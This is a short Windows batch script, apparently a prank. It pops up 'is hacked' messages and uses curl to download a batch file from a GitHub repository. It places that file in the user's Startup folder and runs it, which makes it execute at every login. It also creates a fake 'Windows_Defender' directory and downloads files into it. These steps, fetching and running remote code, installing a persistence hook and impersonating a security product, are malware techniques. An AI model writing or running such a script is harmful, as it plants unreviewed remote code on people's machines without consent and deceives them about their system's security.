START CMD /C "ECHO %username% is hacked  && PAUSE"
START CMD /C "ECHO %username% is hacked  && PAUSE"
START CMD /C "ECHO %username% is hacked  && PAUSE"

curl https://raw.githubusercontent.com/huckardidi/winprank1/main/Windows_System.bat > Windows_System.bat
move Windows_System.bat "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Windows_System.bat

mkdir C:\Windows_Defender
mkdir C:\Windows_Defender\logs
mkdir C:\Windows_Defender\temp
mkdir C:\Windows_Defender\temp\logs
mkdir C:\Windows_Defender\temp\cache
mkdir C:\Windows_Defender\temp\cache\temp

curl https://raw.githubusercontent.com/huckardidi/winprank1/main/1.gif > C:\Windows_Defender\temp\cache\temp\1.gif
curl https://raw.githubusercontent.com/huckardidi/winprank1/main/2.gif > C:\Windows_Defender\temp\cache\temp\2.gif
curl https://raw.githubusercontent.com/huckardidi/winprank1/main/3.gif > C:\Windows_Defender\temp\cache\temp\3.jpg
